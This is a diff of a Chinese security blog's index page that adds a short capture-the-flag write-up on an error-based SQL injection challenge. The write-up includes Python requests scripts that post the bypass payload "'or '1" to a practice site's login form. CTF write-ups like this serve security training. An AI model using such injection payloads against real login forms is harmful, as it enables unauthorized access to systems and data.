@@ -286,6 +286,135 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/03/实验吧-加了料的报错注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新先生">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="新先生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/03/实验吧-加了料的报错注入/" itemprop="url">实验吧---加了料的报错注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-03T09:02:11+08:00">
+                2019-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="实验吧-WEB-加了料的报错注入"><a href="#实验吧-WEB-加了料的报错注入" class="headerlink" title="实验吧 WEB 加了料的报错注入"></a><strong>实验吧 WEB 加了料的报错注入</strong></h4><hr>
+<p>打开页面是post注入，又是报错注入。所以就用到了burp，后来发现burp不好用，加了消息头也不好用，不知道为啥。既然是post那么就用脚本吧。<br>1.首先正常传参：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"1"</span>,<span class="string">'password'</span>:<span class="string">"1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://i1.fuimg.com/695378/75b517bc7aa5cfc5.png" alt><br>2.看看是否能够绕过：<br>(其实这道题比较简单毕竟是直接给你了源码比较好绕过)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/baocuo/index.php"</span></span><br><span class="line">r=requests.session()</span><br><span class="line">s=r.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"'or '1"</span>,<span class="string">'password'</span>:<span class="string">"'or '1"</span>&#125;)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure>
+
+<p>查看回显，呦呵有点东西哈。sql语句在这里就不解释了，很简单。<br><img src="/images/1.png" alt></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/01/apache最新解析漏洞-CVE-2017-15715-绕过文件上传限制/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1585,7 +1714,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1607,7 +1736,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
